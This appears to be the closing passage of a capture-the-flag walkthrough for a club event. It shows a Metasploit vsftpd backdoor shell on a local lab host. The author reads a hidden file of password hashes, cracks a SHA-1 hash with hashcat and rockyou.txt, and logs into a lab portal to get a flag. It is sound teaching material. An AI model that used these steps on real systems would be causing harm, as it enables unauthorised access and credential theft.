+
+```
+> cd beary
+> ls -la
+total 16
+drwxrwxr-- 4 beary beary 4096 Dec 13 02:41 .
+dr-xr-xr-x 4 ftp   ftp   4096 Dec 13 02:41 ..
+drwxrwxr-- 3 beary beary 4096 Dec 13 02:41 .quiet
+drwxrwxr-- 2 beary beary 4096 Dec 13 02:41 home
+```
+
+Similar to franklins directory, it seems beary has chosen to hide information in the same manner. Let's follow the path.
+
+```
+> cd .quiet
+> ls -la
+total 12
+drwxrwxr-- 3 beary beary 4096 Dec 13 02:41 .
+drwxrwxr-- 4 beary beary 4096 Dec 13 02:41 ..
+drwxrwxr-- 2 beary beary 4096 Dec 13 02:41 .quieter
+> cd .quieter
+> ls -la
+total 12
+drwxrwxr-- 2 beary beary 4096 Dec 13 02:41 .
+drwxrwxr-- 3 beary beary 4096 Dec 13 02:41 ..
+-rwxrwxr-- 1 beary beary  439 Dec 13 02:41 .super_quiet
+```
+
+Looking at the file type indicator at the beginning of the permission set (`d` / `-`), we see that we have reached the end of the hidden files. We can read this file as we would any other.
+
+```
+> cat .super_quiet
+
+----------------------------------
+
+- SUPER SECRET PASSWORD DATABASE -
+
+-    Meant for me and me ONLY    -
+
+----------------------------------
+
+svssl:beary:836b7786225fbabdf3fdc128fe9fc3fb9942c012
+spotify:beary:f1034563b5dddacd77a4372649b5fa86bc90ffedd7ff6c6b477c24191be75539
+kholsrewards:papabear:43fa6ee5629494381b31ddabc36d1beb99b0e880bd481aeb5661bf53c998a270
+ftp:beary:c62373dbc3a30a2f7d0d88dd652bb047e754023e8b4c06aa429af76f74daad32
+```
+
+Perfect! We can copy and paste the `svssl` hash into another terminal window.
+
+Exit metasploit through the following, with `^C` being the shortcut to cancel terminal execution:
+```
+> ^C
+Abort session 1? [y/N]  
+> y
+
+[*] 172.17.0.3 - Command shell session 1 closed.  Reason: User exit
+> msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exit
+```
+# 9. Cracking the credentials
+
+We can follow the same workflow as we did when we were cracking franklins credentials previously.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ hash-identifier "836b7786225fbabdf3fdc128fe9fc3fb9942c012"                     
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+
+Possible Hashs:
+[+] SHA-1
+[+] MySQL5 - SHA-1(SHA-1($pass))
+
+Least Possible Hashs:
+[+] Tiger-160
+[+] Haval-160
+[+] RipeMD-160
+[+] SHA-1(HMAC)
+[+] Tiger-160(HMAC)
+[+] RipeMD-160(HMAC)
+[+] Haval-160(HMAC)
+[+] SHA-1(MaNGOS)
+[+] SHA-1(MaNGOS2)
+[+] sha1($pass.$salt)
+[+] sha1($salt.$pass)
+[+] sha1($salt.md5($pass))
+[+] sha1($salt.md5($pass).$salt)
+[+] sha1($salt.sha1($pass))
+[+] sha1($salt.sha1($salt.sha1($pass)))
+[+] sha1($username.$pass)
+[+] sha1($username.$pass.$salt)
+[+] sha1(md5($pass))
+[+] sha1(md5($pass).$salt)
+[+] sha1(md5(sha1($pass)))
+[+] sha1(sha1($pass))
+[+] sha1(sha1($pass).$salt)
+[+] sha1(sha1($pass).substr($pass,0,3))
+[+] sha1(sha1($salt.$pass))
+[+] sha1(sha1(sha1($pass)))
+[+] sha1(strtolower($username).$pass)
+--------------------------------------------------
+ HASH: 
+```
+
+Seems like we are working with an unsalted `SHA-1` hash.
+
+As we already know our attack mode (`0` - `Straight`), we need only to identify the hash code for `SHA-1`. 
+
+> Mind the difference between `SHA-1` and `SHA` when searching for the hash code.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ hashcat --help | grep -w "SHA1" 
+    100 | SHA1
+    ...
+```
+
+`100`. Let's crack the hash and direct the results to the same output file as before.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ hashcat -m 100 -a 0 "836b7786225fbabdf3fdc128fe9fc3fb9942c012" rockyou.txt -o cracked.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-haswell-AMD Ryzen 5 5600X 6-Core Processor, 2918/5900 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache hit:
+* Filename..: rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 100 (SHA1)
+Hash.Target......: 836b7786225fbabdf3fdc128fe9fc3fb9942c012
+Time.Started.....: Fri Dec 20 01:47:43 2024 (1 sec)
+Time.Estimated...: Fri Dec 20 01:47:44 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  6973.2 kH/s (0.07ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 4849664/14344385 (33.81%)
+Rejected.........: 0/4849664 (0.00%)
+Restore.Point....: 4847616/14344385 (33.79%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: p63296386 -> p3L!k4n0
+Hardware.Mon.#1..: Util: 31%
+
+Started: Fri Dec 20 01:47:33 2024
+Stopped: Fri Dec 20 01:47:44 2024
+```
+
+Again, this shouldn't take very long.
+
+# 10. Using the cracked credentials to gain access to the SVSSL portal
+
+Using, `cat`, we are shown the cracked SHA-1 credentials.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ cat cracked.txt 
+9a9f75c7bf95c80832d02d572059a4d0:fr4nkl1n
+836b7786225fbabdf3fdc128fe9fc3fb9942c012:p4p4b34r
+```
+
+We will follow an identical workflow as when logging into SVSSL with Franklin's credentials.
+
+> Do this in a new tab, as you will need both tabs (previous and current) for flag verification after the event.
+
+In a new tab, navigate to `http://172.17.0.2:80/`.
+
+Use the following credentials to gain access to `beary`:
+
+```
+Beary
+p4p4b34r
+```
+
+> If you see `Successfully logged into franklin` after entering the credentials in the current tab, `logout` of the current tab and try again.
+
+Success! We have retrieved the second flag!
+
+---
+
+Congratulations! I hope you have followed along with the steps and have learned something new.
+
+As for flag verification, this is only necessary if you are a member of the Cyber Lions Discord (https://discord.gg/csxvHzpbNy). 
+
+By verifying your flags, you will receive a `CTF 2024` role indicating your completion of the event.
+
+Flag verification format:
+```
+A single screenshot showing the four following points:
+- The flag received by accessing Franklin's account
+- The flag received by accessing Beary's account
+- The time
+- Your information
+	- Name
+	- "Discord handle" (ENCLOSED IN DOUBLE-QUOTES)
+```
+
+Here is an example:
+
+![flag verification example](resources/verification_example.png)
+
+Please send me either an email (raykhelson.ielon@gmail.com) or a direct message via Discord @thesilliestgoose. with your screenshot included.
+
+***Thank you!***
